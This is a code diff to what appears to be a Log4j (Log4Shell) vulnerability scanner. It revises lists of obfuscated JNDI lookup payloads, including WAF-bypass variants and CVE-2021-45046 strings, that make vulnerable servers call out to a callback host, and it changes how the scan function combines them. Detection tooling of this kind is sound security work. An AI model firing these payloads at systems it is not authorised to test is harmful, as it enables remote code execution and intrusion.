@@ -50,15 +50,16 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${hostName}.{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://${hostName}.{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://${hostName}.{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://${hostName}.{{callback_host}}/{{random}}}",
-                       "${jndi:dns://${hostName}.{{callback_host}}}",
-                       ]
+waf_bypass_payloads = [
+    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://1.${hostName}.{{callback_host}}/{{random}}}",
+    "${${::-j}ndi:rmi://2.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:rmi://3.${hostName}.{{callback_host}}}",
+    "${${lower:jndi}:${lower:rmi}://4.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:${lower:jndi}}:${lower:rmi}://5.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://6.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://8.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:dns://9.${hostName}.{{callback_host}}}",
+]
 
 cve_2021_45046 = [
                   "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
@@ -281,13 +282,13 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://${hostName}.%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://0.${hostName}.%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
